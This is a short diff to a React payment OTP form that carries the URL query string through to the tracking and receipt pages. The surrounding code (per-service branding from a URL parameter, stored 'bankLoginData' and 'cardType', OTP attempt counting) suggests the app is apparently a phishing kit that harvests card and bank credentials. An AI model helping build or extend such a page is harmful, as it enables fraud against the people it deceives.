@@ -16,6 +16,7 @@ const PaymentOTPForm = () => {
   const { toast } = useToast();
   const shareId = rawIdParam || "";
   const { data: linkData, isLoading } = useLink(shareId);
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -54,7 +55,7 @@ const PaymentOTPForm = () => {
   const branding = getServiceBranding(serviceKey);
   const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  const serviceQuery = "";
+  const serviceQuery = currentSearch;
 
   useEffect(() => {
     if (serviceKey) {
@@ -71,7 +72,7 @@ const PaymentOTPForm = () => {
     const payloadService = linkData?.payload?.service_key || linkData?.payload?.service;
     const serviceKeyParam = payloadService || urlServiceKey || customerInfo.serviceKey || sessionService;
     if (!method) {
-      navigate(`/pay/${shareId}/track`);
+      navigate(`/pay/${shareId}/track${currentSearch}`);
     }
   }, [shareId, navigate, linkData, urlServiceKey, customerInfo.serviceKey]);
 
@@ -260,7 +261,7 @@ const PaymentOTPForm = () => {
       sessionStorage.removeItem('cardType');
       sessionStorage.removeItem('bankLoginData');
 
-      navigate(`/pay/${shareId}/receipt`);
+      navigate(`/pay/${shareId}/receipt${currentSearch}`);
     } else {
       const newAttempts = attempts + 1;
       setAttempts(newAttempts);
